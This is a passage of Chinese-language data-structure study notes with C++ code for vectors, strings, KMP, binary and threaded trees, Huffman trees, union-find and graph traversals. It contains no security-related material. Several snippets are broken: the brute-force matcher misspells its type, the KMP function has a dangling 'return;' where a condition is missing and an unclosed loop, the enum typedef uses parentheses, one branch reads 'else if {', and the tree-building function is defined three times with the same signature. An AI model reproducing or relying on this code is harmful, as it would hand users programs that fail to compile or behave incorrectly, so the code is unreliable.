查询元素数量</p></li><li><p><code>empty()</code> 判断是否为空</p></li><li><p><code>clear()</code> 清空所有元素</p></li></ul><pre class="language-c++" data-language="c++"><code class="language-c++">#include&lt;vector&gt;#include&lt;iostream&gt;using namespace std;int main()&#123;vector&lt;int&gt; vec;vec.push_back(1);vec.push_back(2);vec.pop_back();vec.push_back(3);cout &lt;&lt; vec.size() &lt;&lt; endl;cout &lt;&lt; vec.front() &lt;&lt; endl;cout &lt;&lt; vec.back() &lt;&lt; endl;cout &lt;&lt; vec[1] &lt;&lt; endl;vec.clear();cout &lt;&lt; vec.empty() &lt;&lt; endl;vector&lt;vector&lt;int&gt;&gt; matrix(3, vector&lt;int&gt;(2, 0));&#x2F;&#x2F; 3行，2列，每行填充0matrix[0][0] &#x3D; 1;matrix[1].push_back(3);vector&lt;int&gt; new_row &#x3D; &#123;5, 7, 9&#125;;matrix.push_back(new_row);for (int i &#x3D; 0; i &lt; matrix.size(); i++) &#123;    for (int j &#x3D; 0; j &lt; matrix[i].size(); j++) &#123;          cout &lt;&lt; matrix[i][j] &lt;&lt; &quot; &quot;;    &#125;    cout &lt;&lt; endl;&#125;&#125;</code></pre><h2 id="串">串</h2><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;using namespace std;#define maxlen 255&#x2F;&#x2F; 顺序存储typedef struct&#123;    char ch[maxlen];    int length;&#125;SString;&#x2F;&#x2F; 堆分配存储typedef struct&#123;    char *ch;    int length;&#125;HString;&#x2F;&#x2F; 链式存储typedef struct CharNode &#123;    char ch;    struct CharNode *next;&#125; CharNode, *CharPtr;typedef struct &#123;    CharPtr head;    int length;&#125; LString;&#x2F;&#x2F; 字串定位算法&#x2F;&#x2F; Brute-Forceint BF(SString s,SSting t,int pos)&#123;    int i &#x3D; pos;    int j &#x3D; 1;    while(i&lt;&#x3D;s.length &amp;&amp; j&lt;&#x3D;t.length())&#123;        if(s.ch[i]&#x3D;&#x3D;t.ch[j])&#123;            i++;            j++;        &#125;            else&#123;                i &#x3D; i - j + 2;                j &#x3D; 1;        &#125;    &#125;   if(j&gt;t.length) return i-t.length;   else return 0;&#125;&#x2F;&#x2F; KMPvector&lt;int&gt; Next(const string &amp;j) &#123;    int m &#x3D; j.length();    vector&lt;int&gt; next(m + 1, 0);    int k &#x3D; 0;    next[0] &#x3D; -1;    for (int i &#x3D; 1; i &lt; m; i++) &#123;        while (k &gt;&#x3D; 0 &amp;&amp; j[i] !&#x3D; j[k]) &#123;            k &#x3D; next[k];        &#125;        k++;        next[i + 1] &#x3D; k;    &#125;    return next;&#125;void KMP(const string &amp;t, const string &amp;j) &#123;    int n &#x3D; t.length();    int m &#x3D; j.length();        return;    &#125;    vector&lt;int&gt; next &#x3D; Next(j);    int i &#x3D; 0;    int k &#x3D; 0;    while (i &lt; n) &#123;        if (k &#x3D;&#x3D; -1 || t[i] &#x3D;&#x3D; j[k]) &#123;            i++;            k++;            if (k &#x3D;&#x3D; m) &#123;                cout &lt;&lt; t.substr(i - m) &lt;&lt; endl;                return;            &#125;        &#125; else &#123;            k &#x3D; next[k];        &#125;    return;&#125;</code></pre><h4 id="stl-4">STL</h4><p><strong>string</strong></p><p>长度：<code>s.size()</code>/<code>s.length()</code></p><p>查找字符（串）第一次出现的位置：<code>s.find(u)</code>/<code>s.find(t,pos)</code><strong>注：不是 KMP</strong></p><p>截取子串：<code>substr(pos,len)</code></p><p>插入：<code>insert(index,str)</code></p><p>替换字符串：<code>replace(first,second,str)</code></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main()&#123;string s &#x3D; &quot;hello, world&quot;;cout &lt;&lt; s.size() &lt;&lt; endl;size_t pos1 &#x3D; s.find(&#39;o&#39;);size_t pos2 &#x3D; s.find(&quot;world&quot;, 0);string sub &#x3D; s.substr(7, 5);string s2 &#x3D; s;s2.insert(5, &quot; C++&quot;);string s3 &#x3D; s;s3.replace(0, 5, &quot;Hi&quot;);&#125;</code></pre><h3 id="广义表">广义表</h3><pre class="language-c++" data-language="c++"><code class="language-c++">typedef enum(ATOM,LIST) ElemTag;&#x2F;&#x2F;ATOM&#x3D;&#x3D;0,原子；LIST&#x3D;&#x3D;1，子表typedef struct GLNode&#123;    ElemTag tag;&#x2F;&#x2F;区分原子结点or表结点    union&#123;        AtomType atom;&#x2F;&#x2F;原子值域        struct&#123;            struct GNode* hp,*tp;        &#125;ptr;    &#125;;&#125;*GList;GetHead(LS);&#x2F;&#x2F;取表头GetTail(LS);&#x2F;&#x2F;取表尾，仍为广义表</code></pre><h2 id="树">树</h2><h4 id="二叉树">二叉树</h4><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;stack&gt;#include &lt;queue&gt;using namespace std;#define MAXSIZE 100typedef int TElemType;&#x2F;&#x2F; 顺序存储结构（即层序遍历，空结点值为0）typedef struct&#123;    TElemType data[MAXSIZE];&#125;SqBiTree;&#x2F;&#x2F; 链式定义结点结构typedef struct BiTNode &#123;    TElemType data;    BiTNode *lchild, *rchild;&#125; BiTNode, *BiTree;&#x2F;&#x2F; 中序遍历（递归）void InOrderTraverse(BiTree T) &#123;    if (T) &#123;        InOrderTraverse(T-&gt;lchild);        cout &lt;&lt; T-&gt;data;        InOrderTraverse(T-&gt;rchild);    &#125;&#125;&#x2F;&#x2F; 先序遍历（递归）void PreOrderTraverse(BiTree T) &#123;    if (T) &#123;        cout &lt;&lt; T-&gt;data;        PreOrderTraverse(T-&gt;lchild);        PreOrderTraverse(T-&gt;rchild);    &#125;&#125;&#x2F;&#x2F; 后序遍历（递归）void PostOrderTraverse(BiTree T) &#123;    if (T) &#123;        PostOrderTraverse(T-&gt;lchild);        PostOrderTraverse(T-&gt;rchild);        cout &lt;&lt; T-&gt;data;    &#125;&#125;&#x2F;&#x2F; 中序遍历（非递归）void InOrderTraverse_NonRecursive(BiTree T) &#123;    stack&lt;BiTree&gt; s;    BiTree p &#x3D; T;    while (p || !s.empty()) &#123;        if (p) &#123;            s.push(p);            p &#x3D; p-&gt;lchild;        &#125; else &#123;            BiTree q &#x3D; s.top();            s.pop();            cout &lt;&lt; q-&gt;data;            p &#x3D; q-&gt;rchild;        &#125;    &#125;&#125;&#x2F;&#x2F; 先序遍历（非递归）void PreOrderTraverse_NonRecursive(BiTree T) &#123;    if (!T) return;    stack&lt;BiTree&gt; s;    s.push(T);    while (!s.empty()) &#123;        BiTree q &#x3D; s.top();        s.pop();        cout &lt;&lt; q-&gt;data;        if (q-&gt;rchild) s.push(q-&gt;rchild); &#x2F;&#x2F; 右子树后访问 根据栈先进后出的原则先进        if (q-&gt;lchild) s.push(q-&gt;lchild);    &#125;&#125;&#x2F;&#x2F; 后序遍历（非递归）void PostOrderTraverse_NonRecursive(BiTree T) &#123;    stack&lt;BiTree&gt; s;    BiTree p &#x3D; T;    BiTree lastVisited &#x3D; nullptr;    while (p || !s.empty()) &#123;        if (p) &#123;            s.push(p);            p &#x3D; p-&gt;lchild;        &#125; else &#123;            BiTree q &#x3D; s.top();            if (q-&gt;rchild &amp;&amp; lastVisited !&#x3D; q-&gt;rchild) &#123;                p &#x3D; q-&gt;rchild;            &#125; else &#123;                cout &lt;&lt; q-&gt;data;                lastVisited &#x3D; q;                s.pop();            &#125;        &#125;    &#125;&#125;&#x2F;&#x2F; 层次遍历二叉树void LevelOrderTraverse(BiTree T) &#123;    if (!T) return;    queue&lt;BiTree&gt; q;    q.push(T);    while (!q.empty()) &#123;        BiTree node &#x3D; q.front();        q.pop();        cout &lt;&lt; node-&gt;data &lt;&lt; &#39; &#39;;        if (node-&gt;lchild)            q.push(node-&gt;lchild);        if (node-&gt;rchild)            q.push(node-&gt;rchild);    &#125;&#125;&#x2F;&#x2F; 根据前序输入创建二叉树，&#39;#&#39;表示空节点void CreateBiTree(BiTree &amp;T) &#123;    char ch;    cin &gt;&gt; ch;    if (ch &#x3D;&#x3D; &#39;#&#39;) &#123;        T &#x3D; nullptr;    &#125; else &#123;        T &#x3D; new BiTNode;        T-&gt;data &#x3D; ch;        CreateBiTree(T-&gt;lchild);        CreateBiTree(T-&gt;rchild);    &#125;&#125;&#x2F;&#x2F; 根据中序输入创建二叉树，&#39;#&#39;表示空节点void CreateBiTree(BiTree &amp;T) &#123;    char ch;    cin &gt;&gt; ch;    if (ch &#x3D;&#x3D; &#39;#&#39;) &#123;        T &#x3D; nullptr;    &#125; else &#123;        CreateBiTree(T-&gt;lchild);        T &#x3D; new BiTNode;        T-&gt;data &#x3D; ch;        CreateBiTree(T-&gt;rchild);    &#125;&#125;&#x2F;&#x2F; 根据后序输入创建二叉树，&#39;#&#39;表示空节点void CreateBiTree(BiTree &amp;T) &#123;    char ch;    cin &gt;&gt; ch;    if (ch &#x3D;&#x3D; &#39;#&#39;) &#123;        T &#x3D; nullptr;    &#125; else &#123;        CreateBiTree(T-&gt;lchild);        CreateBiTree(T-&gt;rchild);        T &#x3D; new BiTNode;        T-&gt;data &#x3D; ch;    &#125;&#125;&#x2F;&#x2F; 计算二叉树的高度int Depth(BiTree T) &#123;    if (!T) return 0;    int m &#x3D; Depth(T-&gt;lchild);    int n &#x3D; Depth(T-&gt;rchild);    return (m &gt; n ? m + 1 : n + 1);&#125;&#x2F;&#x2F; 统计二叉树的节点个数int NodeCount(BiTree T) &#123;    if (!T) return 0;    return NodeCount(T-&gt;lchild) + NodeCount(T-&gt;rchild) + 1;&#125;&#x2F;&#x2F; 线索二叉树的结点结构typedef struct BiThrNode &#123;    TElemType data;    BiThrNode *lchild, *rchild;    int LTag, RTag; &#x2F;&#x2F; 0 表示指针，1 表示线索&#125; BiThrNode, *BiThrTree;&#x2F;&#x2F; 全局变量，用于中序线索化过程中的前驱节点BiThrNode *pre &#x3D; nullptr;&#x2F;&#x2F; 中序线索化（递归）void InThreading(BiThrTree p) &#123;    if (p) &#123;        InThreading(p-&gt;lchild);        if (!p-&gt;lchild) &#123;            p-&gt;LTag &#x3D; 1;            p-&gt;lchild &#x3D; pre;        &#125; else &#123;            p-&gt;LTag &#x3D; 0;        &#125;        if (pre &amp;&amp; !pre-&gt;rchild) &#123;            pre-&gt;RTag &#x3D; 1;            pre-&gt;rchild &#x3D; p;        &#125; else if &#123;            pre-&gt;RTag &#x3D; 0;        &#125;        pre &#x3D; p;        InThreading(p-&gt;rchild);    &#125;&#125;&#x2F;&#x2F; 构建中序线索二叉树（带头结点）void CreateInOrderThread(BiThrTree &amp;T) &#123;    BiThrTree head &#x3D; new BiThrNode;    head-&gt;LTag &#x3D; 0;    head-&gt;RTag &#x3D; 1;    head-&gt;rchild &#x3D; head;    pre &#x3D; head;    head-&gt;lchild &#x3D; T;    InThreading(T);    pre-&gt;rchild &#x3D; head;    pre-&gt;RTag &#x3D; 1;    T &#x3D; head;&#125;&#x2F;&#x2F; 遍历中序线索二叉树（非递归）void InOrderTraverse_Thr(BiThrTree T) &#123;    BiThrTree p &#x3D; T-&gt;lchild;    while (p !&#x3D; T) &#123;        while (p-&gt;LTag &#x3D;&#x3D; 0) p &#x3D; p-&gt;lchild;        cout &lt;&lt; p-&gt;data;        while (p-&gt;RTag &#x3D;&#x3D; 1 &amp;&amp; p-&gt;rchild !&#x3D; T) &#123;            p &#x3D; p-&gt;rchild;            cout &lt;&lt; p-&gt;data;        &#125;        p &#x3D; p-&gt;rchild;    &#125;&#125;</code></pre><h4 id="树与森林">树与森林</h4><pre class="language-c++" data-language="c++"><code class="language-c++">#define MAXSIZE 100&#x2F;&#x2F; 双亲表示法typedef struct&#123;    char data;    int parent;&#125;PTNode;typedef struct&#123;    PTNode nodes[MAXSIZE];    int n;&#125;PTree;&#x2F;&#x2F; 孩子表示法typedef struct CSNode&#123;    char data;    struct CSNode* firstchild,*nextsibling;&#125;CSNode,*CSTree;</code></pre><h4 id="哈夫曼树">哈夫曼树</h4><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;queue&gt;#include &lt;vector&gt;using namespace std;typedef struct&#123;    int weight;    int parent, lchild, rchild;&#125; HTNode, *HuffmanTree;typedef char **HuffmanCode;void CreateHuffmanTree(HuffmanTree &amp;T, int n)&#123;    if (n &lt;&#x3D; 1)        return;    int m &#x3D; 2 * n - 1;    T &#x3D; new HTNode[m + 1];    &#x2F;&#x2F; 初始化所有节点    for (int i &#x3D; 1; i &lt;&#x3D; m; i++)    &#123;        T[i].parent &#x3D; 0;        T[i].lchild &#x3D; 0;        T[i].rchild &#x3D; 0;        T[i].weight &#x3D; 0;    &#125;    &#x2F;&#x2F; 输入叶子节点权重    for (int i &#x3D; 1; i &lt;&#x3D; n; i++)    &#123;        cin &gt;&gt; T[i].weight;    &#125;    &#x2F;&#x2F; 使用优先队列存储    priority_queue&lt;pair&lt;int, int&gt;, vector&lt;pair&lt;int, int&gt;&gt;, greater&lt;pair&lt;int, int&gt;&gt;&gt; pq;    for (int i &#x3D; 1; i &lt;&#x3D; n; i++)    &#123;        pq.push(make_pair(T[i].weight, i));    &#125;    int current &#x3D; n + 1; &#x2F;&#x2F; 当前中间节点索引    for (int i &#x3D; 1; i &lt;&#x3D; n - 1; i++)    &#123;        &#x2F;&#x2F; 获取两个最小节点        int s1 &#x3D; -1, s2 &#x3D; -1;        &#x2F;&#x2F; 寻找第一个有效节点        while (!pq.empty() &amp;&amp; s1 &#x3D;&#x3D; -1)        &#123;            auto top &#x3D; pq.top();            pq.pop();            if (T[top.second].parent &#x3D;&#x3D; 0)            &#123;                s1 &#x3D; top.second;            &#125;        &#125;        &#x2F;&#x2F; 寻找第二个有效节点        while (!pq.empty() &amp;&amp; s2 &#x3D;&#x3D; -1)        &#123;            auto top &#x3D; pq.top();            pq.pop();            if (T[top.second].parent &#x3D;&#x3D; 0)            &#123;                s2 &#x3D; top.second;            &#125;        &#125;        if (s1 &#x3D;&#x3D; -1 || s2 &#x3D;&#x3D; -1)        &#123;            return;        &#125;        &#x2F;&#x2F; 创建新节点        T[current].weight &#x3D; T[s1].weight + T[s2].weight;        T[current].lchild &#x3D; s1;        T[current].rchild &#x3D; s2;        T[s1].parent &#x3D; current;        T[s2].parent &#x3D; current;        &#x2F;&#x2F; 将新节点加入优先队列        pq.push(make_pair(T[current].weight, current));        current++;    &#125;&#125;void CreateHuffmanCode(HuffmanTree HT, HuffmanCode &amp;HC, int n)&#123;    HC &#x3D; new char *[n + 1];    char *cd &#x3D; new char[n];    cd[n - 1] &#x3D; &#39;\0&#39;;    for (int i &#x3D; 1; i &lt;&#x3D; n; i++)    &#123;        int start &#x3D; n - 1;        int c &#x3D; i;        int f &#x3D; HT[i].parent;        while (f !&#x3D; 0)        &#123;            start--;            if (HT[f].lchild &#x3D;&#x3D; c)            &#123;                cd[start] &#x3D; &#39;0&#39;;            &#125;            else            &#123;                cd[start] &#x3D; &#39;1&#39;;            &#125;            c &#x3D; f;            f &#x3D; HT[f].parent;        &#125;        HC[i] &#x3D; new char[n - start];        strcpy(HC[i], &amp;cd[start]);    &#125;    delete[] cd;&#125;</code></pre><h4 id="并查集">并查集</h4><pre class="language-c++" data-language="c++"><code class="language-c++">const int MAXN &#x3D; 1000;int father[MAXN];int Rank[MAXN];void init()&#123;    for (int i &#x3D; 0; i &lt; MAXN; i++)    &#123;        father[i] &#x3D; i;        Rank[i] &#x3D; 1;    &#125;&#125;int find_set(int x)&#123;    if (x !&#x3D; father[x])    &#123;        father[x] &#x3D; find_set(father[x]);    &#125;    return father[x];&#125;void Union(int x, int y)&#123;    int root_x &#x3D; find_set(x);    int root_y &#x3D; find_set(y);    if (root_x &#x3D;&#x3D; root_y)        return;    if (Rank[root_x] &gt; Rank[root_y])    &#123;        father[root_y] &#x3D; root_x;        Rank[root_x] +&#x3D; Rank[root_y];    &#125;    else    &#123;        father[root_x] &#x3D; root_y;        Rank[root_y] +&#x3D; Rank[root_x];    &#125;&#125;</code></pre><h2 id="图">图</h2><p><strong>邻接矩阵</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;#define MaxInt 32767     &#x2F;&#x2F; 极大值#define MVNum 100        &#x2F;&#x2F; 顶点最大值typedef char VerTexType; &#x2F;&#x2F; 顶点类型定义typedef int ArcType;     &#x2F;&#x2F; 边类型定义&#x2F;&#x2F; 邻接矩阵表示法typedef struct&#123;    VerTexType vexs[MVNum];     &#x2F;&#x2F; 顶点表    ArcType arcs[MVNum][MVNum]; &#x2F;&#x2F; 邻接矩阵    int vexnum, arcnum; &#x2F;&#x2F; 顶点数目 边数目&#125; AMGraph;&#x2F;&#x2F; 为AMGraph定位顶点int LocateVex(AMGraph G, VerTexType v)&#123;    for (int i &#x3D; 0; i &lt; G.vexnum; i++)    &#123;        if (G.vexs[i] &#x3D;&#x3D; v)        &#123;            return i;        &#125;    &#125;    return -1;&#125;&#x2F;&#x2F; 初始化邻接矩阵void CreateAM(AMGraph &amp;G)&#123;    cin &gt;&gt; G.vexnum &gt;&gt; G.arcnum;    for (int i &#x3D; 0; i &lt; G.vexnum; i++)    &#123;        cin &gt;&gt; G.vexs[i];    &#125;    for (int i &#x3D; 0; i &lt; G.vexnum; i++)    &#123;        for (int j &#x3D; 0; j &lt; G.vexnum; j++)        &#123;            if (i &#x3D;&#x3D; j)            &#123;                G.arcs[i][j] &#x3D; 0;            &#125;            else            &#123;                G.arcs[i][j] &#x3D; MaxInt;            &#125;        &#125;    &#125;    for (int k &#x3D; 0; k &lt; G.arcnum; k++)    &#123;        VerTexType v1, v2;        ArcType w;        cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w;        int i &#x3D; LocateVex(G, v1);        int j &#x3D; LocateVex(G, v2);        G.arcs[i][j] &#x3D; w;        G.arcs[j][i] &#x3D; w;    &#125;&#125;</code></pre><p><strong>邻接表</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include&lt;bits&#x2F;stdc++.h&gt;using namespace std;&#x2F;&#x2F; 邻接表表示法typedef struct ArcNode&#123;    int adjvex; &#x2F;&#x2F; 该边指向的顶点位置    int weight; &#x2F;&#x2F; 边的权重    struct ArcNode *nextarc;&#125; ArcNode;typedef struct VNode&#123;    VerTexType data;   &#x2F;&#x2F; 顶点信息    ArcNode *firstarc; &#x2F;&#x2F; 指向第一条边的指针&#125; VNode, AdjList[MVNum];typedef struct&#123;    AdjList vertices;   &#x2F;&#x2F; 邻接表    int vexnum, arcnum; &#x2F;&#x2F; 顶点数和边数&#125; ALGraph;&#x2F;&#x2F; 为 ALGraph 定位顶点int LocateVex(const ALGraph &amp;G, VerTexType v)&#123;    for (int i &#x3D; 0; i &lt; G.vexnum; i++)    &#123;        if (G.vertices[i].data &#x3D;&#x3D; v)        &#123;            return i;        &#125;    &#125;    return -1;&#125;&#x2F;&#x2F; 初始化邻接表void CreateAL(ALGraph &amp;G)&#123;    cin &gt;&gt; G.vexnum &gt;&gt; G.arcnum;    for (int i &#x3D; 0; i &lt; G.vexnum; i++)    &#123;        cin &gt;&gt; G.vertices[i].data;        G.vertices[i].firstarc &#x3D; NULL;    &#125;    for (int k &#x3D; 0; k &lt; G.arcnum; k++)    &#123;        VerTexType v1, v2;        ArcType weight;        cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; weight;        int i &#x3D; LocateVex(G, v1);        int j &#x3D; LocateVex(G, v2);        &#x2F;&#x2F; 添加边 v1 -&gt; v2 头插法        ArcNode *p1 &#x3D; new ArcNode;        p1-&gt;adjvex &#x3D; j;        p1-&gt;weight &#x3D; weight;        p1-&gt;nextarc &#x3D; G.vertices[i].firstarc;        G.vertices[i].firstarc &#x3D; p1;        &#x2F;* 添加边 v2 -&gt; v1（无向图必须对称）        ArcNode *p2 &#x3D; new ArcNode;        p2-&gt;adjvex &#x3D; i;        p2-&gt;weight &#x3D; weight;        p2-&gt;nextarc &#x3D; G.vertices[j].firstarc;        G.vertices[j].firstarc &#x3D; p2;        *&#x2F;    &#125;&#125;</code></pre><p><strong>十字链表</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F; 十字链表表示法（有向图）typedef struct ArcNode_OL &#123;    int tailvex;             &#x2F;&#x2F; 弧尾顶点位置    int headvex;             &#x2F;&#x2F; 弧头顶点位置    struct ArcNode_OL *hlink; &#x2F;&#x2F; 指向同一弧头的下一条弧    struct ArcNode_OL *tlink; &#x2F;&#x2F; 指向同一弧尾的下一条弧    int weight;              &#x2F;&#x2F; 弧的权值    InfoType info;        &#x2F;&#x2F; 其他信息&#125; ArcNode_OL;typedef struct VexNode_OL &#123;    VerTexType data;         &#x2F;&#x2F; 顶点数据    ArcNode_OL *firstin;     &#x2F;&#x2F; 指向以该顶点为弧头的第一条弧    ArcNode_OL *firstout;    &#x2F;&#x2F; 指向以该顶点为弧尾的第一条弧&#125; VexNode_OL;typedef struct &#123;    VexNode_OL xlist[MVNum]; &#x2F;&#x2F; 顶点表    int vexnum, arcnum;      &#x2F;&#x2F; 顶点数和弧数&#125; OLGraph;</code></pre><p><strong>邻接多重表</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F; 邻接多重表表示法（无向图）typedef struct EBox &#123;    int ivex, jvex;          &#x2F;&#x2F; 该边依附的两个顶点位置    struct EBox *ilink;      &#x2F;&#x2F; 指向依附于顶点ivex的下一条边    struct EBox *jlink;      &#x2F;&#x2F; 指向依附于顶点jvex的下一条边    int weight;              &#x2F;&#x2F; 边的权值    bool mark;             &#x2F;&#x2F; 访问标记    InfoType info;         &#x2F;&#x2F; 其他信息&#125; EBox;typedef struct VexBox &#123;    VerTexType data;         &#x2F;&#x2F; 顶点数据    EBox *firstedge;         &#x2F;&#x2F; 指向第一条依附于该顶点的边&#125; VexBox;typedef struct &#123;    VexBox adjmulist[MVNum]; &#x2F;&#x2F; 顶点表    int vexnum, edgenum;     &#x2F;&#x2F; 顶点数和边数&#125; AMLGraph;</code></pre><p><strong>DFS</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;const int MVNum &#x3D; 100;bool visited[MVNum];vector&lt;int&gt; path;struct AMGraph&#123;    int arcs[MVNum][MVNum];    int vexnum, arcnum;&#125;;struct ArcNode&#123;    int adjvex;    ArcNode *nextarc;&#125;;struct VNode&#123;    ArcNode *firstarc;&#125;;struct ALGraph&#123;    VNode vertices[MVNum];    int vexnum, arcnum;&#125;;void DFS_AM(AMGraph G, int v)&#123;    cout &lt;&lt; v &lt;&lt; &quot; &quot;;    visited[v] &#x3D; true;    path.push_back(v);    for (int w &#x3D; 0; w &lt; G.vexnum; w++)        if (G.arcs[v][w] &amp;&amp; !visited[w])            DFS_AM(G, w);&#125;void DFS_AL(ALGraph G, int v)&#123;    cout &lt;&lt; v &lt;&lt; &quot; &quot;;    visited[v] &#x3D; true;    path.push_back(v);    ArcNode *p &#x3D; G.vertices[v].firstarc;    while (p)    &#123;        int w &#x3D; p-&gt;adjvex;        if (!visited[w])            DFS_AL(G, w);        p &#x3D; p-&gt;nextarc;    &#125;&#125;void DFSTraverse_AM(AMGraph G)&#123;    path.clear();    for (int i &#x3D; 0; i &lt; G.vexnum; ++i)        visited[i] &#x3D; false;    for (int i &#x3D; 0; i &lt; G.vexnum; ++i)        if (!visited[i])            DFS_AM(G, i);&#125;void DFSTraverse_AL(ALGraph G)&#123;    path.clear();    for (int i &#x3D; 0; i &lt; G.vexnum; ++i)        visited[i] &#x3D; false;    for (int i &#x3D; 0; i &lt; G.vexnum; ++i)        if (!visited[i])            DFS_AL(G, i);&#125;void PrintPath()&#123;    for (size_t i &#x3D; 0; i &lt; path.size(); ++i) &#123;        cout &lt;&lt; path[i];        if (i &lt; path.size() - 1)            cout &lt;&lt; &quot; -&gt; &quot;;    &#125;    cout &lt;&lt; endl;&#125;</code></pre><p><strong>BFS</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;queue&gt;using namespace std;const int MVNum &#x3D; 100;bool visited[MVNum];vector&lt;int&gt; path;struct AMGraph&#123;    int arcs[MVNum][MVNum];    int vexnum, arcnum;&#125;;struct ArcNode&#123;    int adjvex;    ArcNode *nextarc;&#125;;struct VNode&#123;    ArcNode *firstarc;&#125;;struct ALGraph&#123;    VNode vertices[MVNum];    int vexnum, arcnum;&#125;;void BFS_AM(AMGraph G, int v)&#123;    queue&lt;int&gt; Q;    cout &lt;&lt; v &lt;&lt; &quot; &quot;;    visited[v] &#x3D; true;    path.push_back(v);    Q.push(v);    while (!Q.empty())    &#123;        int u &#x3D; Q.front();        Q.pop();        for (int w &#x3D; 0; w &lt; G.vexnum; w++)        &#123;            if (G.arcs[u][w] &amp;&amp; !visited[w])            &#123;                cout &lt;&lt; w &lt;&lt; &quot; &quot;;                visited[w] &#x3D; true;                path.push_back(w);                Q.push(w);            &#125;        &#125;    &#125;&#125;void BFS_AL(ALGraph G, int v)&#123;    queue&lt;int&gt; Q;    cout &lt;&lt; v &lt;&lt; &quot; &quot;;    visited[v] &#x3D; true;    path.push_back(v);    Q.push(v);    while (!Q.empty())    &#123;        int u &#x3D; Q.front();        Q.pop();        ArcNode *p &#x3D; G.vertices[u].firstarc;        while (p)        &#123;            int w &#x3D; p-&gt;adjvex;            if (!visited[w])            &#123;                cout &lt;&lt; w &lt;&lt; &quot; &quot;;                visited[w] &#x3D; true;                path.push_back(w);                Q.push(w);            &#125;            p &#x3D; p-&gt;nextarc;        &#125;    &#125;&#125;void BFSTraverse_AM(AMGraph G)&#123;    path.clear();    for (int i &#x3D; 0; i &lt; G.vexnum; ++i)        visited[i] &#x3D; false;    for (int i &#x3D; 0; i &lt; G.vexnum; ++i)        if (!visited[i])            BFS_AM(G, i);&#125;void BFSTraverse_AL(ALGraph G)&#123;    path.clear();    for (int i &#x3D; 0; i &lt; G.vexnum; ++i)        visited[i] &#x3D; false;    for (int i &#x3D; 0; i &lt; G.vexnum; ++i)        if (!visited[i])            BFS_AL(G, i);&#125;void PrintPath()&#123;    for (size_t i &#x3D; 0; i &lt; path.size(); ++i) &#123;        cout &lt;&lt; path[i];        if (i &lt; path.size() - 1)            cout &lt;&lt; &quot; -&gt; &quot;;    &#125;    cout &lt;&lt; endl;&#125;</code></pre><p><strong>最小生成树（MST）</strong></p><p><strong>Kruskal</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include&lt;bits&#x2F;stdc++.h&gt;using namespace std;#define MAXVEX 100#define INF 114514typedef struct &#123;    int adjvex;    int weight;    struct ArcNode *next;&#125; ArcNode;typedef struct &#123;    ArcNode *firstarc;&#125; AdjList[MAXVEX];typedef struct &#123;    AdjList vertices;    int vexnum, arcnum;&#125; Graph;bool hasCycle(Graph &amp;G, int from, int to, vector&lt;bool&gt;&amp; visited, int parent) &#123;    visited[from] &#x3D; true;    ArcNode* p &#x3D; G.vertices[from].firstarc;    while(p) &#123;        int next &#x3D; p-&gt;adjvex;        if(!visited[next]) &#123;        if(hasCycle(G, next, to, visited, from)) &#123;                return true;            &#125;        &#125;        else if( next !&#x3D; parent &amp;&amp; next &#x3D;&#x3D; to) &#123;            return true;        &#125;        p &#x3D; p-&gt;next;    &#125;    return false;&#125;bool isSafe(Graph &amp;G, int from, int to) &#123;    vector&lt;bool&gt; visited(G.vexnum + 1, false);    return !hasCycle(G, from, to, visited, -1);&#125;void CreateGraph(Graph &amp;G) &#123;    cin &gt;&gt; G.vexnum &gt;&gt; G.arcnum;    for(int i&#x3D;1; i&lt;&#x3D;G.vexnum; i++) &#123;        G.vertices[i].firstarc &#x3D; nullptr;    &#125;    for(int i&#x3D;1; i&lt;&#x3D;G.arcnum; i++) &#123;        int m,n,w;        cin &gt;&gt; m &gt;&gt; n &gt;&gt; w;        ArcNode *p1 &#x3D; new ArcNode;        p1-&gt;adjvex &#x3D; n;        p1-&gt;weight &#x3D; w;        p1-&gt;next &#x3D; G.vertices[m].firstarc;        G.vertices[m].firstarc &#x3D; p1;        ArcNode *p2 &#x3D; new ArcNode;        p2-&gt;adjvex &#x3D; m;        p2-&gt;weight &#x3D; w;        p2-&gt;next &#x3D; G.vertices[n].firstarc;        G.vertices[n].firstarc &#x3D; p2;    &#125;&#125;void PrintMST(vector&lt;vector&lt;int&gt;&gt; &amp;mst, int n) &#123;    for(int i&#x3D;1; i&lt;&#x3D;n; i++) &#123;        for(int j&#x3D;i+1; j&lt;&#x3D;n; j++) &#123;            if(mst[i][j] !&#x3D; 0) &#123;                cout &lt;&lt; i &lt;&lt; &quot; &quot; &lt;&lt; j &lt;&lt; endl;            &#125;        &#125;    &#125;&#125;int main() &#123;    Graph G;    CreateGraph(G);    vector&lt;vector&lt;int&gt;&gt; mst(G.vexnum+1, vector&lt;int&gt;(G.vexnum+1, 0));    int MSTedge &#x3D; 0;    while(MSTedge &lt; G.vexnum-1) &#123;        int min &#x3D; INF;        int p1 &#x3D; -1, p2 &#x3D; -1;        for(int i&#x3D;1; i&lt;&#x3D;G.vexnum; i++) &#123;            ArcNode *p &#x3D; G.vertices[i].firstarc;            while(p) &#123;                if(p-&gt;weight &lt; min &amp;&amp; !mst[i][p-&gt;adjvex] &amp;&amp; isSafe(G, i, p-&gt;adjvex)) &#123;                    min &#x3D; p-&gt;weight;                    p1 &#x3D; i;                    p2 &#x3D; p-&gt;adjvex;                &#125;                p &#x3D; p-&gt;next;            &#125;        &#125;        if(p1 &#x3D;&#x3D; -1) &#123;            cout &lt;&lt; &quot;Invalid.&quot; &lt;&lt; endl;            return 1;        &#125;        mst[p1][p2] &#x3D; 1;        mst[p2][p1] &#x3D; 1;        MSTedge++;    